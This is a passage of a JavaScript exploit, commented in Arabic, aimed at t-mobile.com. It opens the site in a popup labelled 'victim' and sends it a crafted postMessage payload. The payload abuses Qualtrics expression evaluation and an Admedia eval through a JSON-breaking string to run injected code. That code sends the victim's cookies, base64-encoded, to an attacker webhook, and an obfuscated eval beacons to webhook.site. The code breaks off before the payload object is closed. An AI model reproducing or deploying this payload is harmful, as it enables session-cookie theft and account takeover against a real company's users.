    function pwnTMobile() {
        log("فتح نافذة الضحية...");
        const vic = window.open('https://www.t-mobile.com/', 'victim');

        if (!vic) {
            alert("يرجى السماح بالـ Pop-ups!");
            return;
        }

        //Payload مُحسّن لاختراق الـ Logic Tree في Qualtrics (QSI)
        const payload = {
            "type": "qm-sync", 
            "details": {
                // استهداف مباشر لـ doEvalJS عبر التعبيرات البرمجية
                "EmbeddedData": {
                    "Expression": `navigator.sendBeacon('${webhook}/?cookie=' + btoa(document.cookie))`
                },
                "Comparator": "JAVASCRIPT_EXPRESSION",
                "Expression": `navigator.sendBeacon('${webhook}/?exec=true')`,
                
                // استهداف الـ eval بتاع Admedia عن طريق كسر الـ JSON
                "action": "createNew'); eval(atob('bmF2aWdhdG9yLnNlbmRCZWFjb24oJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzNkMmQ5OWZmLTU0NzItNDU1ZS04NGU0LTY0ZjUwMzVlMjI3Zicp'));//",

        log("بدء نبضات الحقن (Payload Pulse)...");

            vic.postMessage(JSON.stringify(payload), "*");
